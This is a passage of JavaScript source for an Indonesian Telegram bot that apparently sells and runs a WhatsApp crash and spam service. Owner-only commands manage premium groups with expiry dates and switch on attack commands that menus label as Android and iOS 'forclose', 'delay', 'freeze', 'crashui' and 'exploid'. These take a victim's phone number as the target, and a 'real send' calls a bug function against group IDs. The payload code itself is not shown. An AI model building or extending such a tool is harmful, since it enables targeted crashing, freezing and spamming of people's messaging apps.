    if (isRealSend) {
      murbugraa3(groupJid).catch(() => {});
    } else {
      await new Promise(resolve => setTimeout(resolve, 1200));
    }

    if (count >= 3) {
      groupSendTracker.delete(groupJid);
    }

  } catch (error) {
    bot.sendMessage(chatId, `❌ Terjadi kesalahan sistem.`);
  }
});

//------( CASE GROUP ONLY )-----\\\
bot.onText(/^\/gruponly (on|of)/i, (msg, match) => {
      const chatId = msg.chat.id;
      const senderId = msg.from.id;
      
        if (!isOwner(senderId)) {
      return bot.sendMessage(chatId, `
𝙷𝙰𝙽𝚈𝙰 𝙾𝚆𝙽𝙴𝚁 𝙰𝙽𝙹 𝚈𝙰𝙽𝙶 𝙱𝙸𝚂𝙰 𝙼𝙰𝙺𝙴 𝙽𝙸 𝙵𝙸𝚃𝚄𝚁`);
  }
      const mode = match[1].toLowerCase();
      const status = mode === "on";
      setGroupOnly(status);

      bot.sendMessage(msg.chat.id, `Fitur *Group Only* sekarang: ${status ? "AKTIF" : "NONAKTIF"}`, {
      parse_mode: "Markdown",
      });
      });

// --------------------- ( FUNCTION GROUP ONLY ) ---------------------- \\

function isGroupOnly() {
         if (!fs.existsSync(ONLY_FILE)) return false;
        const data = JSON.parse(fs.readFileSync(ONLY_FILE));
        return data.groupOnly;
        }


function setGroupOnly(status)
            {
            fs.writeFileSync(ONLY_FILE, JSON.stringify({ groupOnly: status }, null, 2));
            }

    function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
    if (eventType === 'change') {
    try {
    const updatedData = JSON.parse(fs.readFileSync(filePath));
    updateCallback(updatedData);
    console.log(`File ${filePath} updated successfully.`);
    } catch (error) {
    console.error(`Error updating ${filePath}:`, error.message);
    }
    }
    });
    }

// =================== END LOGIN VPS FEATURE ===================
// ==============================
const GROUP_ALLOW_FILE = path.join(__dirname, "𝔙𝔢́𝔩𝔬𝔯𝔦𝔞", "AllowedGroups.json");

function loadAllowedGroups() {
  try {
    if (!fs.existsSync(GROUP_ALLOW_FILE)) return [];

    const raw = JSON.parse(fs.readFileSync(GROUP_ALLOW_FILE, "utf8"));

    let groups = [];

    // Format baru: { groups: [...] }
    if (Array.isArray(raw?.groups)) {
      groups = raw.groups;
    }
    // Format lama: langsung array
    else if (Array.isArray(raw)) {
      groups = raw;
    }

    // Normalisasi format
    return groups.map(g => {
      if (typeof g === "string") {
        return { id: String(g), expired: 0 }; // lama tanpa expired
      }
      if (typeof g === "object" && g?.id) {
        return {
          id: String(g.id),
          expired: Number(g.expired) || 0
        };
      }
      return null;
    }).filter(Boolean);

  } catch {
    return [];
  }
}

function saveAllowedGroups(groups) {
  try {
    fs.mkdirSync(path.dirname(GROUP_ALLOW_FILE), { recursive: true });

    fs.writeFileSync(
      GROUP_ALLOW_FILE,
      JSON.stringify(
        {
          groups,
          updatedAt: Date.now()
        },
        null,
        2
      )
    );
  } catch {}
}

let allowedGroups = loadAllowedGroups();

function refreshAllowedGroups() {
  allowedGroups = loadAllowedGroups();
  return allowedGroups;
}

function isGroupChat(msg) {
  const t = msg?.chat?.type;
  return t === "group" || t === "supergroup";
}

function isGroupAllowed(chatId) {
  const now = Date.now();

  const found = allowedGroups.find(g => String(g.id) === String(chatId));
  if (!found) return false;

  // Kalau expired = 0 → permanent
  if (!found.expired || found.expired === 0) return true;

  // Kalau masih aktif
  if (found.expired > now) return true;

  // Kalau sudah expired → auto remove
  allowedGroups = allowedGroups.filter(g => String(g.id) !== String(chatId));
  saveAllowedGroups(allowedGroups);

  return false;
}

// /addgroup (jalankan di group)
bot.onText(/^\/addgroup(?:\s+(\d+)d)?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from?.id;

  if (!isOwner(senderId)) {
    return bot.sendMessage(chatId, "𝙷𝙰𝙽𝚈𝙰 𝙾𝚆𝙽𝙴𝚁 𝙰𝙽𝙹 𝚈𝙰𝙽𝙶 𝙱𝙸𝚂𝙰 𝙼𝙰𝙺𝙴 𝙽𝙸 𝙵𝙸𝚃𝚄𝚁");
  }

  if (!isGroupChat(msg)) {
    return bot.sendMessage(chatId, "𝙿𝚎𝚛𝚒𝚗𝚝𝚊𝚑 𝚒𝚗𝚒 𝚑𝚊𝚗𝚢𝚊 𝚋𝚒𝚜𝚊 𝚍𝚒𝚙𝚊𝚔𝚊𝚒 𝚍𝚒 𝙶𝚁𝙾𝚄𝙿.");
  }

  const gid = String(chatId);

  // ===== HELP / FORMAT =====
  if (!match || !match[1]) {
    return bot.sendMessage(chatId, `
<blockquote>
╭───「 ADD GROUP PREMIUM 」───
│
│ Format:
│ /addgroup 5d
│
│ Keterangan:
│ d = hari
│
│ Contoh:
│ /addgroup 7d  (aktif 7 hari)
│ /addgroup 30d (aktif 30 hari)
│
╰────────────────
</blockquote>
`, { parse_mode: "HTML" });
  }

  const days = parseInt(match[1], 10);

  if (isNaN(days) || days <= 0) {
    return bot.sendMessage(chatId, `
<blockquote>
╭───「 ADD GROUP PREMIUM 」───
│ ❌ Durasi tidak valid!
│ Gunakan contoh: /addgroup 5d
╰────────────────
</blockquote>
`, { parse_mode: "HTML" });
  }

  const now = Date.now();
  const addMs = days * 24 * 60 * 60 * 1000;

  // ===== SUPPORT FORMAT LAMA (ARRAY STRING) =====
  // Kalau allowedGroups masih ["-100xxx", ...] ubah jadi objek
  if (Array.isArray(allowedGroups) && allowedGroups.length > 0 && typeof allowedGroups[0] === "string") {
    allowedGroups = allowedGroups.map(id => ({ id: String(id), expired: now }));
  }

  // ===== CARI DATA GROUP =====
  const idx = allowedGroups.findIndex(g => String(g.id) === gid);

  let oldExpired = 0;
  let newExpired = 0;

  if (idx !== -1) {
    oldExpired = Number(allowedGroups[idx].expired) || 0;

    // Kalau masih aktif, extend dari expired lama
    // Kalau sudah habis, mulai dari sekarang
    const base = oldExpired > now ? oldExpired : now;
    newExpired = base + addMs;

    allowedGroups[idx].expired = newExpired;
  } else {
    newExpired = now + addMs;
    allowedGroups.push({ id: gid, expired: newExpired });
  }

  saveAllowedGroups(allowedGroups);

  const expireDate = new Date(newExpired).toLocaleString("id-ID");
  const remainingMs = newExpired - now;
  const remainingDays = Math.ceil(remainingMs / (24 * 60 * 60 * 1000));

  const statusLine = (oldExpired && oldExpired > now)
    ? `✅ EXTEND +${days} Hari`
    : `✅ AKTIF ${days} Hari`;

  return bot.sendMessage(chatId, `
<blockquote>
╭───「 𝙶𝚁𝙾𝚄𝙿 𝙿𝚁𝙴𝙼𝙸𝚄𝙼 𝙼𝙰𝙽𝙰𝙶𝙴𝚁 」───
│
│ 〆 𝙶𝚛𝚘𝚞𝚙 𝙸𝙳   : <code>${gid}</code>
│ 〆 𝙰𝚌𝚝𝚒𝚘𝚗     : ${statusLine}
│ 〆 𝚂𝚒𝚜𝚊       : ${remainingDays} Hari
│ 〆 𝙴𝚡𝚙𝚒𝚛𝚎𝚍    : ${expireDate}
│
│ 〆 𝙰𝚔𝚜𝚎𝚜      : Premium All Member
│
╰────────────────
</blockquote>
`, { parse_mode: "HTML" });

});

// /delgroup (jalankan di group)
bot.onText(/^\/delgroup$/i, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from?.id;

  if (!isOwner(senderId)) {
    return bot.sendMessage(chatId, "𝙷𝙰𝙽𝚈𝙰 𝙾𝚆𝙽𝙴𝚁 𝙰𝙽𝙹 𝚈𝙰𝙽𝙶 𝙱𝙸𝚂𝙰 𝙼𝙰𝙺𝙴 𝙽𝙸 𝙵𝙸𝚃𝚄𝚁");
  }

  if (!isGroupChat(msg)) {
    return bot.sendMessage(chatId, "𝙿𝚎𝚛𝚒𝚗𝚝𝚊𝚑 𝚒𝚗𝚒 𝚑𝚊𝚗𝚢𝚊 𝚋𝚒𝚜𝚊 𝚍𝚒𝚙𝚊𝚔𝚊𝚒 𝚍𝚒 𝙶𝚁𝙾𝚄𝙿.");
  }

  const gid = String(chatId);

  // ===== SUPPORT FORMAT LAMA & BARU =====
  let found = false;

  if (Array.isArray(allowedGroups) && allowedGroups.length > 0) {

    if (typeof allowedGroups[0] === "string") {
      // FORMAT LAMA
      if (allowedGroups.includes(gid)) {
        found = true;
        allowedGroups = allowedGroups.filter(x => x !== gid);
      }

    } else {
      // FORMAT BARU { id, expired }
      const beforeLength = allowedGroups.length;
      allowedGroups = allowedGroups.filter(g => String(g.id) !== gid);
      found = allowedGroups.length !== beforeLength;
    }
  }

  if (!found) {
    return bot.sendMessage(chatId, `
<blockquote>
╭───「 𝙶𝚁𝙾𝚄𝙿 𝙿𝚁𝙴𝙼𝙸𝚄𝙼 𝙼𝙰𝙽𝙰𝙶𝙴𝚁 」───
│
│ ❌ 𝙶𝚛𝚘𝚞𝚙 𝚒𝚗𝚒 𝚝𝚒𝚍𝚊𝚔 𝚝𝚎𝚛𝚍𝚊𝚏𝚝𝚊𝚛
│ 𝚜𝚎𝚋𝚊𝚐𝚊𝚒 𝚙𝚛𝚎𝚖𝚒𝚞𝚖.
│
│ 𝙶𝚛𝚘𝚞𝚙 𝙸𝙳 :
│ <code>${gid}</code>
│
╰────────────────
</blockquote>
`, { parse_mode: "HTML" });
  }

  saveAllowedGroups(allowedGroups);

  return bot.sendMessage(chatId, `
<blockquote>
╭───「 𝙶𝚁𝙾𝚄𝙿 𝙿𝚁𝙴𝙼𝙸𝚄𝙼 𝙼𝙰𝙽𝙰𝙶𝙴𝚁 」───
│
│ ✅ 𝙿𝚛𝚎𝚖𝚒𝚞𝚖 𝚋𝚎𝚛𝚑𝚊𝚜𝚒𝚕 𝚍𝚒𝚑𝚊𝚙𝚞𝚜
│
│ 〆 𝙶𝚛𝚘𝚞𝚙 𝙸𝙳 :
│ <code>${gid}</code>
│
│ 𝚂𝚝𝚊𝚝𝚞𝚜 :
│ ❌ 𝙽𝚘𝚗-𝙿𝚛𝚎𝚖𝚒𝚞𝚖
│
╰────────────────
</blockquote>
`, { parse_mode: "HTML" });
});

// /listgroup (bisa di private / group)
bot.onText(/^\/listgroup$/i, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from?.id;

  if (!isOwner(senderId)) {
    return bot.sendMessage(chatId, "𝙷𝙰𝙽𝚈𝙰 𝙾𝚆𝙽𝙴𝚁 𝙰𝙽𝙹 𝚈𝙰𝙽𝙶 𝙱𝙸𝚂𝙰 𝙼𝙰𝙺𝙴 𝙽𝙸 𝙵𝙸𝚃𝚄𝚁");
  }

  if (!Array.isArray(allowedGroups) || allowedGroups.length === 0) {
    return bot.sendMessage(chatId, `
<blockquote>
╭───「 𝙶𝚁𝙾𝚄𝙿 𝙿𝚁𝙴𝙼𝙸𝚄𝙼 𝙼𝙰𝙽𝙰𝙶𝙴𝚁 」───
│
│ ❌ 𝙱𝚎𝚕𝚞𝚖 𝚊𝚍𝚊 𝚐𝚛𝚘𝚞𝚙 𝚙𝚛𝚎𝚖𝚒𝚞𝚖
│ 𝚢𝚊𝚗𝚐 𝚝𝚎𝚛𝚍𝚊𝚏𝚝𝚊𝚛.
│
╰────────────────
</blockquote>
`, { parse_mode: "HTML" });
  }

  const now = Date.now();
  let text = `
<blockquote>
╭───「 𝙻𝙸𝚂𝚃 𝙶𝚁𝙾𝚄𝙿 𝙿𝚁𝙴𝙼𝙸𝚄𝙼 」───
│
`;

  allowedGroups.forEach((g, i) => {

    // ===== FORMAT LAMA (STRING) =====
    if (typeof g === "string") {
      text += `│ ${i + 1}. <code>${g}</code>\n`;
      text += `│    Status : ✅ Aktif (Tanpa Expired)\n│\n`;
    }

    // ===== FORMAT BARU (OBJECT) =====
    else if (g && typeof g === "object") {
      const expired = Number(g.expired) || 0;

      if (!expired) {
        text += `│ ${i + 1}. <code>${g.id}</code>\n`;
        text += `│    Status : ⚠️ Tidak ada data expired\n│\n`;
      } else {
        const remainingMs = expired - now;
        const remainingDays = Math.ceil(remainingMs / (24 * 60 * 60 * 1000));

        if (remainingMs > 0) {
          text += `│ ${i + 1}. <code>${g.id}</code>\n`;
          text += `│    Status : ✅ ${remainingDays} Hari lagi\n`;
          text += `│    Expired: ${new Date(expired).toLocaleString("id-ID")}\n│\n`;
        } else {
          text += `│ ${i + 1}. <code>${g.id}</code>\n`;
          text += `│    Status : ❌ Expired\n`;
          text += `│    Expired: ${new Date(expired).toLocaleString("id-ID")}\n│\n`;
        }
      }
    }
  });

  text += `╰────────────────</blockquote>`;

  return bot.sendMessage(chatId, text, { parse_mode: "HTML" });
});
// ==============================
const CMD_ACTIVE_FILE = path.join(__dirname, "𝔙𝔢́𝔩𝔬𝔯𝔦𝔞", "ActiveCommands.json");

function loadActiveCommands() {
  try {
    if (!fs.existsSync(CMD_ACTIVE_FILE)) return [];
    const data = JSON.parse(fs.readFileSync(CMD_ACTIVE_FILE, "utf8"));
    if (Array.isArray(data)) return data.map(String);
    if (Array.isArray(data?.active)) return data.active.map(String);
    return [];
  } catch {
    return [];
  }
}

function saveActiveCommands(list) {
  try {
    fs.mkdirSync(path.dirname(CMD_ACTIVE_FILE), { recursive: true });
    fs.writeFileSync(CMD_ACTIVE_FILE, JSON.stringify({ active: list, updatedAt: Date.now() }, null, 2));
  } catch {}
}

let activeCmds = loadActiveCommands();

function normalizeCmd(cmd) {
  cmd = String(cmd || "").trim();
  if (!cmd) return null;
  if (!cmd.startsWith("/")) cmd = "/" + cmd;
  cmd = cmd.split(/\s+/)[0];
  return cmd;
}

function refreshActiveCommands() {
  activeCmds = loadActiveCommands();
  return activeCmds;
}

// default: kalau belum diaktifkan => dianggap MATI
function isCmdActive(cmd) {
  const c = normalizeCmd(cmd);
  if (!c) return false;
  // kalau mau selalu realtime baca file, uncomment:
  // refreshActiveCommands();
  return activeCmds.includes(c);
}

// ==============================
// /aktif /command  (owner only)
// ==============================
// ==============================
// /aktif /command (owner only)
// ==============================
bot.onText(/^\/aktif(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from?.id;

  if (!isOwner(senderId)) {
    return bot.sendMessage(chatId, "𝙷𝙰𝙽𝚈𝙰 𝙾𝚆𝙽𝙴𝚁 𝙰𝙽𝙹 𝚈𝙰𝙽𝙶 𝙱𝙸𝚂𝙰 𝙼𝙰𝙺𝙴 𝙽𝙸 𝙵𝙸𝚃𝚄𝚁");
  }

  const rawInput = match?.[1];
  const cmd = normalizeCmd(rawInput);

  if (!cmd) {
    return bot.sendMessage(chatId, `
<blockquote>
╭───「 COMMAND MANAGER 」───
│
│ ❌ Format salah!
│ Gunakan: /aktif /forclose
│ Contoh : /aktif /blankclick
│
╰────────────────
</blockquote>
`, { parse_mode: "HTML" });
  }

  // LIST VALID COMMAND (harus sama dengan /cmd)
  const validCommands = ["/xbugs", "/xkill", "/xynerx", "/zypherx", "/xivorx", "/noctex", "/qexon", "/blankgc", "/delaygc", "/fcgc", "/foreclx", "/forexit", "/forcloz", "/frezehard"];

  if (!validCommands.includes(cmd)) {
    return bot.sendMessage(chatId, `
<blockquote>
╭───「 𝙲𝙾𝙼𝙼𝙰𝙽𝙳 𝙼𝙰𝙽𝙰𝙶𝙴𝚁 」───
│
│ ❌ 𝙲𝚘𝚖𝚖𝚊𝚗𝚍 𝚝𝚒𝚍𝚊𝚔 𝚍𝚒𝚝𝚎𝚖𝚞𝚔𝚊𝚗!
│
│ 〆 ${cmd}
│
│ 𝙿𝚊𝚜𝚝𝚒𝚔𝚊𝚗 𝚜𝚎𝚜𝚞𝚊𝚒 𝚍𝚊𝚏𝚝𝚊𝚛 𝚍𝚒 /cmd
│
╰────────────────
</blockquote>
`, { parse_mode: "HTML" });
  }

  refreshActiveCommands();

  if (activeCmds.includes(cmd)) {
    return bot.sendMessage(chatId, `
<blockquote>
╭───「 𝙲𝙾𝙼𝙼𝙰𝙽𝙳 𝙼𝙰𝙽𝙰𝙶𝙴𝚁 」───
│
│ ⚠️ 𝙲𝚘𝚖𝚖𝚊𝚗𝚍 𝚜𝚞𝚍𝚊𝚑 𝚊𝚔𝚝𝚒𝚏
│
│ 〆 ${cmd}
│
╰────────────────
</blockquote>
`, { parse_mode: "HTML" });
  }

  activeCmds.push(cmd);
  saveActiveCommands(activeCmds);

  return bot.sendMessage(chatId, `
<blockquote>
╭───「 𝙲𝙾𝙼𝙼𝙰𝙽𝙳 𝙼𝙰𝙽𝙰𝙶𝙴𝚁 」───
│
│ ✅ 𝙲𝚘𝚖𝚖𝚊𝚗𝚍 𝚋𝚎𝚛𝚑𝚊𝚜𝚒𝚕 𝚍𝚒𝚊𝚔𝚝𝚒𝚏𝚔𝚊𝚗
│
│ 〆 ${cmd}
│ 〆 𝚂𝚝𝚊𝚝𝚞𝚜 : 🟢 𝙰𝙲𝚃𝙸𝚅𝙴
│
╰────────────────
</blockquote>
`, { parse_mode: "HTML" });
});
// ==============================
// /nonaktif /command (owner only)
// ==============================
// ==============================
// /nonaktif /command (owner only)
// ==============================
bot.onText(/^\/nonaktif(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from?.id;

  if (!isOwner(senderId)) {
    return bot.sendMessage(chatId, "𝙷𝙰𝙽𝚈𝙰 𝙾𝚆𝙽𝙴𝚁 𝙰𝙽𝙹 𝚈𝙰𝙽𝙶 𝙱𝙸𝚂𝙰 𝙼𝙰𝙺𝙴 𝙽𝙸 𝙵𝙸𝚃𝚄𝚁");
  }

  const rawInput = match?.[1];
  const cmd = normalizeCmd(rawInput);

  if (!cmd) {
    return bot.sendMessage(chatId, `
<blockquote>
╭───「 𝙲𝙾𝙼𝙼𝙰𝙽𝙳 𝙼𝙰𝙽𝙰𝙶𝙴𝚁 」───
│
│ ❌ 𝙵𝚘𝚛𝚖𝚊𝚝 𝚜𝚊𝚕𝚊𝚑!
│ 𝙶𝚞𝚗𝚊𝚔𝚊𝚗: /nonaktif /forclose
│ 𝙲𝚘𝚗𝚝𝚘𝚑 : /nonaktif /blankclick
│
╰────────────────
</blockquote>
`, { parse_mode: "HTML" });
  }

  // LIST VALID COMMAND (harus sama dengan /cmd & /aktif)
  const validCommands = ["/xbugs", "/xkill", "/xynerx", "/zypherx", "/xivorx", "/noctex", "/qexon", "/blankgc", "/delaygc", "/fcgc", "/foreclx", "/forexit", "/forcloz", "/frezehard"];

  if (!validCommands.includes(cmd)) {
    return bot.sendMessage(chatId, `
<blockquote>
╭───「 𝙲𝙾𝙼𝙼𝙰𝙽𝙳 𝙼𝙰𝙽𝙰𝙶𝙴𝚁 」───
│
│ ❌ 𝙲𝚘𝚖𝚖𝚊𝚗𝚍 𝚝𝚒𝚍𝚊𝚔 𝚍𝚒𝚝𝚎𝚖𝚞𝚔𝚊𝚗!
│
│ 〆 ${cmd}
│
│ 𝙲𝚎𝚔 𝚍𝚊𝚏𝚝𝚊𝚛 𝚍𝚒 /cmd
│
╰────────────────
</blockquote>
`, { parse_mode: "HTML" });
  }

  refreshActiveCommands();

  if (!activeCmds.includes(cmd)) {
    return bot.sendMessage(chatId, `
<blockquote>
╭───「 𝙲𝙾𝙼𝙼𝙰𝙽𝙳 𝙼𝙰𝙽𝙰𝙶𝙴𝚁 」───
│
│ ⚠️ 𝙲𝚘𝚖𝚖𝚊𝚗𝚍 𝚋𝚎𝚕𝚞𝚖 𝚊𝚔𝚝𝚒𝚏
│
│ 〆 ${cmd}
│ 〆 𝚂𝚝𝚊𝚝𝚞𝚜 : 🔴 𝙾𝙵𝙵𝙻𝙸𝙽𝙴
│
╰────────────────
</blockquote>
`, { parse_mode: "HTML" });
  }

  activeCmds = activeCmds.filter(x => x !== cmd);
  saveActiveCommands(activeCmds);

  return bot.sendMessage(chatId, `
<blockquote>
╭───「 𝙲𝙾𝙼𝙼𝙰𝙽𝙳 𝙼𝙰𝙽𝙰𝙶𝙴𝚁 」───
│
│ ✅ 𝙲𝚘𝚖𝚖𝚊𝚗𝚍 𝚋𝚎𝚛𝚑𝚊𝚜𝚒𝚕 𝚍𝚒𝚗𝚘𝚗𝚊𝚔𝚝𝚒𝚏𝚔𝚊𝚗
│
│ 〆 ${cmd}
│ 〆 𝚂𝚝𝚊𝚝𝚞𝚜 : 🔴 𝙾𝙵𝙵𝙻𝙸𝙽𝙴
│
╰────────────────
</blockquote>
`, { parse_mode: "HTML" });
});

// ==============================
// /cmd (owner only)
// ==============================
bot.onText(/^\/cmd$/i, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from?.id;

  if (!isOwner(senderId)) {
    return bot.sendMessage(chatId, "𝙷𝙰𝙽𝚈𝙰 𝙾𝚆𝙽𝙴𝚁 𝙰𝙽𝙹 𝚈𝙰𝙽𝙶 𝙱𝙸𝚂𝙰 𝙼𝙰𝙺𝙴 𝙽𝙸 𝙵𝙸𝚃𝚄𝚁");
  }

  refreshActiveCommands();

  const categories = [
  { 
    title: "📱 𝙰𝚗𝚍𝚛𝚘𝚒𝚍 • 𝙸𝚗𝚟𝚒𝚜𝚒𝚋𝚕𝚎 𝙷𝚊𝚛𝚍 𖤐 (𝚂𝚙𝚊𝚖)", 
    cmds: ["xbugs", "xkill", "xynerx", "zypherx", "xivorx"] 
  },
  { 
    title: "📱 𝙰𝚗𝚍𝚛𝚘𝚒𝚍 • 𝙵𝚘𝚛𝚌𝚕𝚘𝚜𝚎 𝚇 𝙳𝚎𝚕𝚊𝚢 (𝚂𝚙𝚊𝚖)", 
    cmds: ["foreclx", "forexit", "Forcloz"] 
  },
  { 
    title: "🍏 𝚒𝙾𝚂 • 𝙵𝚘𝚛𝚌𝚕𝚘𝚜𝚎 𖤐 (𝚂𝚙𝚊𝚖)", 
    cmds: ["noctex", "qexon"] 
  },
  { 
    title: "👥 𝙶𝚛𝚘𝚞𝚙 𝙵𝚎𝚊𝚝𝚞𝚛𝚎𝚜 • 𝙻𝚒𝚗𝚔", 
    cmds: ["blankgc", "delaygc", "fcgc"] 
  },
  { 
    title: "💀 𝙵𝚛𝚎𝚣𝚎 𝚇 𝙳𝚎𝚕𝚊𝚢 • 𝚃𝚊𝚛𝚐𝚎𝚝", 
    cmds: ["frezehard"] 
  }
];

  let body = "╭───「 𝙰𝙻𝙻 𝙲𝙾𝙼𝙼𝙰𝙽𝙳 𝚂𝚃𝙰𝚃𝚄𝚂 」───\n\n";

  // Fungsi biar rata kanan
  const padRight = (text, length) => {
    return text + " ".repeat(Math.max(1, length - text.length));
  };

  const longestCmd = Math.max(
    ...categories.flatMap(c => c.cmds.map(cmd => ("/" + cmd).length))
  );

  for (const cat of categories) {
    body += `${cat.title}\n`;

    for (const cmd of cat.cmds) {
      const fullCmd = "/" + cmd;
      const status = isCmdActive(fullCmd)
        ? "🟢 ACTIVE"
        : "🔴 OFFLINE";

      body += `➪ ${padRight(fullCmd, longestCmd + 2)}${status}\n`;
    }

    body += "\n";
  }

  body += "────────────────────────────\n";
  body += "𝙲𝚊𝚛𝚊 𝙼𝚎𝚗𝚐𝚊𝚔𝚝𝚒𝚏𝚔𝚊𝚗 : /aktif /command\n";
  body += "𝙲𝚊𝚛𝚊 𝙼𝚎𝚗𝚘𝚗𝚊𝚔𝚝𝚒𝚏𝚔𝚊𝚗 : /nonaktif /command\n";
  body += "╰────────────────────────────";

  const messageText = `\`\`\`\n${body}\n\`\`\``;

  return bot.sendMessage(chatId, messageText, {
    parse_mode: "Markdown"
  });
});
// ==============================
// /aktifall (owner only)
// ==============================
bot.onText(/^\/aktifall$/i, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from?.id;

  if (!isOwner(senderId)) {
    return bot.sendMessage(chatId, "𝙷𝙰𝙽𝚈𝙰 𝙾𝚆𝙽𝙴𝚁 𝙰𝙽𝙹 𝚈𝙰𝙽𝙶 𝙱𝙸𝚂𝙰 𝙼𝙰𝙺𝙴 𝙽𝙸 𝙵𝙸𝚃𝚄𝚁");
  }

  // Pastikan list sama persis dengan /cmd
  const allCommands = [
  "/xbugs", "/xkill", "/xynerx", "/zypherx", "/xivorx", "/noctex", "/qexon", "/blankgc", "/delaygc", "/fcgc", "/foreclx", "/forexit", "/forcloz", "/frezehard"
];

  if (!Array.isArray(activeCmds)) activeCmds = [];
  refreshActiveCommands();

  let added = 0;

  for (const cmd of allCommands) {
    const c = normalizeCmd(cmd);
    if (c && !activeCmds.includes(c)) {
      activeCmds.push(c);
      added++;
    }
  }

  saveActiveCommands(activeCmds);

  return bot.sendMessage(chatId, `
<blockquote>
╭───「 𝙲𝙾𝙼𝙼𝙰𝙽𝙳 𝙼𝙰𝙽𝙰𝙶𝙴𝚁 」───
│
│ ✅ 𝙰𝙺𝚃𝙸𝙵𝙺𝙰𝙽 𝚂𝙴𝙼𝚄𝙰 𝙲𝙾𝙼𝙼𝙰𝙽𝙳
│
│ 𝚃𝚘𝚝𝚊𝚕 𝙲𝚘𝚖𝚖𝚊𝚗𝚍 : ${allCommands.length}
│ 𝙳𝚒𝚝𝚊𝚖𝚋𝚊𝚑𝚔𝚊𝚗   : ${added}
│ 𝚂𝚎𝚔𝚊𝚛𝚊𝚗𝚐 𝙰𝚔𝚝𝚒𝚏 : ${activeCmds.length}
│
╰────────────────
</blockquote>
`, { parse_mode: "HTML" });
});

// ==============================
// /resetall (owner only)
// ==============================
bot.onText(/^\/resetall$/i, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from?.id;

  if (!isOwner(senderId)) {
    return bot.sendMessage(chatId, "𝙷𝙰𝙽𝚈𝙰 𝙾𝚆𝙽𝙴𝚁 𝙰𝙽𝙹 YANG BISA MENGGUNAKAN FITUR INI");
  }

  refreshActiveCommands();

  const totalBefore = activeCmds.length;

  activeCmds = [];
  saveActiveCommands(activeCmds);

  return bot.sendMessage(chatId, `
<blockquote>
╭───「 𝙲𝙾𝙼𝙼𝙰𝙽𝙳 𝙼𝙰𝙽𝙰𝙶𝙴𝚁 」───
│
│ ⚠️ 𝚁𝙴𝚂𝙴𝚃 𝚂𝙴𝙼𝚄𝙰 𝙲𝙾𝙼𝙼𝙰𝙽𝙳
│
│ 𝚃𝚘𝚝𝚊𝚕 𝚂𝚎𝚋𝚎𝚕𝚞𝚖𝚗𝚢𝚊 : ${totalBefore}
│ 𝚂𝚎𝚔𝚊𝚛𝚊𝚗𝚐 𝙰𝚔𝚝𝚒𝚏   : 0
│
│ 𝚂𝚝𝚊𝚝𝚞𝚜 : 🔴 𝙰𝙻𝙻 𝙾𝙵𝙵𝙻𝙸𝙽𝙴
│
╰────────────────
</blockquote>
`, { parse_mode: "HTML" });
});
const COMMANDS = [
  "delay",
  "delayv2",
  "delayv3",
  "freezealbum",
  "exploid",
  "delayinvis",
  "fciphone",
  "bulldozer",
  "crashnotif",
  "crashui",
  "addsender",
  "delsender"
];

// pakai boundary biar tidak ketarik prefix delay saja
const regex = new RegExp(`\\/(${COMMANDS.join("|")})(?:\\s+(.+))?\\b`);

bot.onText(regex, (msg, match) => {
  const chatId = msg.chat.id;
  const command = match[1];
  const target = match[2];

  if (!target) {
    return bot.sendMessage(
      chatId,
`<blockquote>❌ 𝙵𝙾𝚁𝙼𝙰𝚃 𝚂𝙰𝙻𝙰𝙷!

✔ 𝙴𝚡𝚊𝚖𝚙𝚕𝚎:
/${command} 628xxxx</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  return; // kalau benar tidak reply
});
//=======plugins=======//
bot.onText(/\/tiktok (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const url = match[1];

  if (!url.includes("tiktok.com")) {
    return bot.sendMessage(chatId, "⚠️ *URL TikTok tidak valid!*", {
      parse_mode: "Markdown",
    });
  }

  try {
    const result = await tiktokDl(url);
    const video = result.video_links.find((v) => v.type === "nowatermark");

    if (!video) {
      return bot.sendMessage(
        chatId,
        "⚠️ *𝙶𝚊𝚐𝚊𝚕 𝚖𝚎𝚗𝚍𝚊𝚙𝚊𝚝𝚔𝚊𝚗 𝚟𝚒𝚍𝚎𝚘 𝚝𝚊𝚗𝚙𝚊 𝚠𝚊𝚝𝚎𝚛𝚖𝚊𝚛𝚔!*",
        { parse_mode: "Markdown" }
      );
    }

    const caption =
      `📌 *${result.title}*\n` +
      `👤 *${result.author.nickname}*\n` +
      `🎥 *${result.stats.views}* views\n` +
      `❤️ *${result.stats.likes}* likes\n` +
      `💬 *${result.stats.comment}* comments\n` +
      `🔄 *${result.stats.share}* shares\n` +
      `📅 *Diunggah:* ${result.taken_at}\n` +
      `⏳ *Durasi:* ${result.duration}`;

    await bot.sendVideo(chatId, video.url, {
      caption,
      parse_mode: "Markdown",
    });
  } catch (err) {
    bot.sendMessage(chatId, `❌ *𝙶𝚊𝚐𝚊𝚕 𝚖𝚎𝚗𝚐𝚊𝚖𝚋𝚒𝚕 𝚟𝚒𝚍𝚎𝚘:* ${err.message}`, {
      parse_mode: "Markdown",
    });
  }
});

bot.onText(/^\/grouponly (on|off)/, (msg, match) => {

    if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "⚠️ *𝙰𝚔𝚜𝚎𝚜 𝙳𝚒𝚝𝚘𝚕𝚊𝚔*\n𝙰𝚗𝚍𝚊 𝚝𝚒𝚍𝚊𝚔 𝚖𝚎𝚖𝚒𝚕𝚒𝚔𝚒 𝚒𝚣𝚒𝚗 𝚞𝚗𝚝𝚞𝚔 𝚖𝚎𝚗𝚐𝚐𝚞𝚗𝚊𝚔𝚊𝚗 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 𝚒𝚗𝚒.*",
    { parse_mode: "Markdown" }
  );
}

  const mode = match[1] === "on";
  setOnlyGroup(mode);

  bot.sendMessage(
    msg.chat.id,
    `Mode *𝙶𝚛𝚘𝚞𝚙 𝙾𝚗𝚕𝚢* sekarang *${mode ? "𝙰𝙺𝚃𝙸𝙵" : "𝙽𝙾𝙽𝙰𝙺𝚃𝙸𝙵"}*`,
